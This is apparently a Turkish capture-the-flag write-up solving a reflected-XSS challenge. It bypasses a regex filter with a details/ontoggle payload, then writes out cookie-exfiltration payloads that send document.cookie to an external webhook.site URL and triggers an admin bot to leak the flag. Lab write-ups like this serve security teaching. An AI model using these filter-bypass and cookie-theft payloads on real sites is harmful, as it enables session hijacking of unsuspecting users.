# 🎯 XSS101-Medium - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Reflected XSS-purple?style=for-the-badge" alt="XSS">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 600

**Açıklama:** Regex filtreleme var! Klasik XSS payloadları engellenmiş. Yaratıcı olmalısın.

**Challenge URL:** http://64.226.74.243:7001/

---

## 🔍 Analiz

**Hedef:** Admin botun cookie'sini çalmak

**Strateji:** URL analizi → Filtreleri tespit et → Bypass payload bul → Cookie exfiltration → Bot trigger → Flag

**İpuçları:**
- 🎯 "Regex filtreleme" → Event handler'lar engellenmiş olabilir
- 🪲 "Klasik payloadlar engellenmiş" → Alternatif taglar/eventler dene
- 🤖 "Admin bot" → Otomatik ziyaretçi mevcut
- 💡 Medium seviye → Event handler bypass gerekli

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: Hedef Sayfayı İnceleme**

**Siteye curl ile bağlanıyoruz:**

```bash
curl http://64.226.74.243:7001/
```

**Response:**

```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <title>Medium XSS Challenge</title>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="badge">MEDIUM</span>
            <h1>🔒 Regex Bypass Challenge</h1>
        </div>

        <div class="description">
            <p><strong>Hedef:</strong> Filtreleri bypass ederek admin botun cookie'sini çalın.</p>
        </div>

        <form method="GET" action="">
            <div class="form-group">
                <label for="comment">💬 Yorumunuz:</label>
                <textarea id="comment" name="comment" placeholder="Yorumunuzu yazın..."></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Gönder</button>
            <button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>
            <a href="/" class="btn btn-back">← Geri Dön</a>
        </form>
    </div>

    <script>
        function reportToAdmin() {
            const url = window.location.href;
            
            fetch('/api/report.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    challenge: 'medium',
                    url: url
                })
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    alert('✅ Admin botu sayfanızı ziyaret ediyor! Regex bypass başarılı mı?');
                } else {
                    alert('❌ Hata: ' + data.message);
                }
            })
        }
    </script>
</body>
</html>
```

**Analiz:**
- ✅ Form var - GET methodu kullanıyor
- ✅ `comment` parametresi ile girdi alıyor
- ✅ "Report to Admin" butonu mevcut
- ✅ Bot `/api/report.php` endpoint'ini kullanıyor
- 💡 Kullanıcı girdisi sayfada reflection yapabilir

---

### 🔎 **Adım 2: Reflection Noktasını Bulma**

**Test girdisi gönderiyoruz:**

```bash
curl "http://64.226.74.243:7001/?comment=TEST123"
```

**Response:**

```html
<form method="GET" action="">
    <div class="form-group">
        <label for="comment">💬 Yorumunuz:</label>
        <textarea id="comment" name="comment" placeholder="Yorumunuzu yazın...">TEST123</textarea>
    </div>
    <button type="submit" class="btn btn-primary">Gönder</button>
    <button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>
</form>

<div class="comment-box">
    <h3>📝 Yorumunuz:</h3>
    <div style="margin-top: 10px; color: #333;">
        TEST123
    </div>
</div>
```

**✅ İKİ REFLECTION NOKTASI BULUNDU!**

1. **Textarea value içinde:** `<textarea>...TEST123</textarea>`
2. **HTML içinde:** `<div>TEST123</div>` ← **Daha kolay exploit!**

**Analiz:**
- ✅ Kullanıcı girdisi HTML içinde yansıtılıyor
- ⚠️ Filtreleme var mı test etmeliyiz
- 💡 XSS mümkün olabilir

---

### ⚡ **Adım 3: Basit XSS Payload Testi**

**Klasik script tag payload:**

```bash
curl "http://64.226.74.243:7001/?comment=<script>alert(1)</script>"
```

**Response:**

```html
<div class="comment-box">
    <h3>📝 Yorumunuz:</h3>
    <div style="margin-top: 10px; color: #333;">
        BLOCKEDalert(1)BLOCKED
    </div>
</div>
```

**❌ SCRIPT TAG ENGELLENDİ!**

- ❌ `<script>` tag'i "BLOCKED" ile değiştirilmiş
- ⚠️ Regex filtresi aktif
- 💡 Alternatif payload gerekli

---

### 🔍 **Adım 4: Event Handler Testi**

**Image tag ile onerror event:**

```bash
curl "http://64.226.74.243:7001/?comment=<img src=x onerror=alert(1)>"
```

**Response:**

```html
<div class="comment-box">
    <h3>📝 Yorumunuz:</h3>
    <div style="margin-top: 10px; color: #333;">
        <img src=x BLOCKEDalert(1)>
    </div>
</div>
```

**❌ ONERROR ENGELLENDİ!**

**SVG onload testi:**

```bash
curl "http://64.226.74.243:7001/?comment=<svg/onload=alert(1)>"
```

**Response:**

```html
<div class="comment-box">
    <h3>📝 Yorumunuz:</h3>
    <div style="margin-top: 10px; color: #333;">
        <svg/BLOCKEDalert(1)>
    </div>
</div>
```

**❌ ONLOAD DA ENGELLENDİ!**

**Analiz:**
- ❌ `<script>` → BLOCKED
- ❌ `onerror` → BLOCKED
- ❌ `onload` → BLOCKED
- 💡 Regex filtresi şunları engelliyor: script, on* event'leri
- 🎯 Nadir kullanılan event handler'lar denenmeli

---

### 🎨 **Adım 5: Alternatif Event Handler Keşfi**

**Details tag ile ontoggle event:**

```bash
curl "http://64.226.74.243:7001/?comment=<details open ontoggle=alert(1)>"
```

**Response:**

```html
<div class="comment-box">
    <h3>📝 Yorumunuz:</h3>
    <div style="margin-top: 10px; color: #333;">
        <details open ontoggle=alert(1)>
    </div>
</div>
```

**🎉 ONTOGGLE ENGELLENMEDİ!**

**Tarayıcıda test:**

```
http://64.226.74.243:7001/?comment=<details open ontoggle=alert(1)>
```

**✅ ALERT ÇALIŞTI!**

**Analiz:**
- ✅ `<details>` tag'i geçiyor
- ✅ `ontoggle` event'i filtrelenmemiş
- ✅ `open` attribute ile otomatik tetikleniyor
- 🎯 Bu payload'ı cookie çalmak için kullanabiliriz

---

### 🪝 **Adım 6: Webhook Servisi Kurulumu**

**Webhook.site kullanıyoruz:**

```
https://webhook.site
```

**Otomatik unique URL oluşturuldu:**
```
https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab
```

**Analiz:**
- ✅ Webhook hazır - cookie'ler buraya gönderilecek
- ✅ Request'leri real-time görebileceğiz

---

### 🎯 **Adım 7: Cookie Exfiltration Payload Hazırlama**

**İlk deneme - location redirect:**

```bash
curl "http://64.226.74.243:7001/?comment=<details open ontoggle=location='https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?'+document.cookie>"
```

**Tarayıcıda test:**
```
http://64.226.74.243:7001/?comment=<details open ontoggle=location='https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?'+document.cookie>
```

**Webhook.site response:**
```
✅ 1 request geldi!
Query string: wp-settings-time-2=1770037534
```

**✅ KENDİ COOKIE'MİZ GELDİ!**

**Analiz:**
- ✅ Payload çalışıyor
- ✅ Cookie exfiltration başarılı
- ⚠️ Ama bu bizim cookie'miz
- 💡 Daha güvenilir method: fetch()

---

### 🔄 **Adım 8: Fetch ile İyileştirme**

**Fetch methodu ile payload:**

```bash
curl "http://64.226.74.243:7001/?comment=<details open ontoggle=fetch('https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?'+document.cookie)>"
```

**Tarayıcıda test:**
```
http://64.226.74.243:7001/?comment=<details open ontoggle=fetch('https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?'+document.cookie)>
```

**Webhook.site response:**
```
✅ 1 request geldi!
Query string: wp-settings-time-2=1770037534
```

**✅ FETCH METHODU ÇALIŞTI!**

**Analiz:**
- ✅ `fetch()` kullanımı daha güvenilir
- ✅ Sayfa yeniden yönlendirilmiyor
- ✅ Cookie başarıyla gönderildi
- 🎯 Şimdi admin botu tetikleyeceğiz

---

### 🤖 **Adım 9: Bot Mekanizmasını Anlama**

**Bot endpoint'ini tespit ediyoruz:**

```bash
curl http://64.226.74.243:7001/ | grep -i "report\|bot\|admin"
```

**Response:**

```html
<p><strong>Hedef:</strong> Filtreleri bypass ederek admin botun cookie'sini çalın.</p>
<button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>

<script>
function reportToAdmin() {
    const url = window.location.href;
    
    fetch('/api/report.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            challenge: 'medium',
            url: url
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.success) {
            alert('✅ Admin botu sayfanızı ziyaret ediyor! Regex bypass başarılı mı?');
        }
    })
}
</script>
```

**Analiz:**
- ✅ Bot endpoint: `/api/report.php`
- ✅ POST method kullanıyor
- ✅ JSON payload: `{"challenge":"medium","url":"..."}`
- 💡 Bot'a URL göndereceğiz, bot o URL'i ziyaret edecek

---

### 💥 **Adım 10: Final Payload - Admin Cookie Çalma**

**Tarayıcıda payload URL'ini oluşturuyoruz:**

```
http://64.226.74.243:7001/?comment=<details open ontoggle=fetch('https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?'+document.cookie)>
```

**Tarayıcıda bu URL'e gidiyoruz ve "Report to Admin" butonuna tıklıyoruz**

**Bot API çağrısı (background'da otomatik):**
```javascript
fetch('/api/report.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        challenge: 'medium',
        url: 'http://64.226.74.243:7001/?comment=<details open ontoggle=fetch(\'https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?\'+document.cookie)>'
    })
})
```

**Response:**
```
✅ Admin botu sayfanızı ziyaret ediyor! Regex bypass başarılı mı?
```

**✅ BOT AKTİF OLDU!**

**Analiz:**
- ✅ Bot URL'i ziyaret ediyor
- ✅ Payload çalışacak
- ✅ Admin cookie'si webhook'a gönderilecek

---

### 🏆 **Adım 11: Flag Elde Etme**

**10 saniye sonra Webhook.site'ı yeniliyoruz...**

**🎉 2 REQUEST GELDİ!**

**İlk request (Query String):**
```
wp-settings-time-2=1770037534
```
*Bu bizim cookie'miz (test sırasında kendi payload'ımızı tetikledik)*

**İkinci request (Query String):**
```
flag=FLAG{OkadarRegexYAzdikYinemiYaKurabiyeCanavari}
```

**✅ ADMIN COOKIE'Sİ ÇALINDI!**

---

## 🚩 **FLAG**

```
FLAG{OkadarRegexYAzdikYinemiYaKurabiyeCanavari}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP request</sub></td>
<td align="center">🪝<br><b>Webhook.site</b><br><sub>Request logging</sub></td>
<td align="center">🔍<br><b>Browser DevTools</b><br><sub>Console & Network</sub></td>
<td align="center">🧪<br><b>grep</b><br><sub>Text search</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Sayfa analizi
curl http://64.226.74.243:7001/

# Reflection testi
curl "http://64.226.74.243:7001/?comment=TEST123"

# Script tag testi
curl "http://64.226.74.243:7001/?comment=<script>alert(1)</script>"

# Onerror testi
curl "http://64.226.74.243:7001/?comment=<img src=x onerror=alert(1)>"

# Onload testi
curl "http://64.226.74.243:7001/?comment=<svg/onload=alert(1)>"

# Ontoggle testi
curl "http://64.226.74.243:7001/?comment=<details open ontoggle=alert(1)>"

# Cookie exfiltration (tarayıcıda)
http://64.226.74.243:7001/?comment=<details open ontoggle=fetch('https://webhook.site/755bb11c-f7b3-4853-ab1e-c593f2fd8cab?'+document.cookie)>

# Bot endpoint analizi
curl http://64.226.74.243:7001/ | grep -i "report\|bot\|admin"
```

---

## 💭 **Çözüm Akış Şeması**

```
🎯 XSS101-Medium Challenge
            ↓
🌐 Hedef sayfayı incele
   → GET parametresi: comment
   → Reflection: HTML içinde
            ↓
🔎 Test girdisi gönder
   → comment=TEST123
   → <div>TEST123</div>
            ↓
⚡ XSS payload testi
   → <script>alert(1)</script>
   → ❌ BLOCKED!
            ↓
🔍 Event handler testi
   → onerror → ❌ BLOCKED!
   → onload → ❌ BLOCKED!
            ↓
🎨 Alternatif event bul
   → ontoggle → ✅ Çalıştı!
   → <details open ontoggle=...>
            ↓
🪝 Webhook.site kurulumu
   → URL: webhook.site/755bb...
            ↓
🎯 Cookie payload hazırla
   → location → ✅ Çalıştı
   → fetch() → ✅ Daha iyi!
            ↓
🤖 Bot mekanizması
   → POST /api/report.php
   → Bot URL'i ziyaret eder
            ↓
💥 Final payload
   → <details open ontoggle=
        fetch('webhook?'+cookie)>
            ↓
🏆 Admin cookie çalındı
   → flag=FLAG{...}
            ↓
🚩 FLAG{OkadarRegexYAzdikYinemiYaKurabiyeCanavari}
```
